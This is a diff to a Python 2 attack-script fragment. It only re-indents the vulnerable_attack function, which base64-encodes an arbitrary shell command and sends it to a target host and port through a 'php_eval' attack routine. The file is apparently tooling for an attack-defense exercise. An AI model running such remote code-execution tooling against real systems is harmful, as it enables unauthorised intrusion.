@@ -8,7 +8,7 @@ import traceback
 from replay import *
 
 def vulnerable_attack(target,target_port,cmd):
-	
+        
     '''
     this is the payload script for vuln:
 
@@ -16,15 +16,15 @@ def vulnerable_attack(target,target_port,cmd):
 
     '''
     
-    try:	   
+    try:           
         print "cmd => " + cmd
         cmd = base64.b64encode(cmd) 
         cmd = urllib.quote(cmd)
-	res = sequence_attack(target,target_port,cmd,'php_eval',1)	 
+        res = sequence_attack(target,target_port,cmd,'php_eval',1)       
     except Exception,e:
-	debug_print(traceback.format_exc())	
+        debug_print(traceback.format_exc())     
         dump_error("attack failed",target,"vulnerable attack")
-	res = "error"
+        res = "error"
 
     return res
 
